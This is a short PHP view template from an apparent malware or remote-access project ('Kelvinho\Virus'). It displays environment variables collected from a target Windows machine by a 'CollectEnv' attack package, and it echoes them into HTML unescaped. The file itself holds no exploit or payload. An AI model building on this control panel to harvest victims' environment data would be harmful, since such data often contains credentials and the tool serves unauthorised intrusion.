<?php

use function Kelvinho\Virus\map;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectEnv\CollectEnv $attack */

?>
<p>This attack is executed. The environmental variables are:</p>
<ul style="overflow: auto; background-color: var(--surface)"><?php echo implode(map($attack->getEnv(),
        fn($values, $key) => "<li><pre>$key</pre><ul>" . implode(map($values, fn($value) => "<li><pre>$value</pre></li>")) . "</ul></li>")); ?></ul>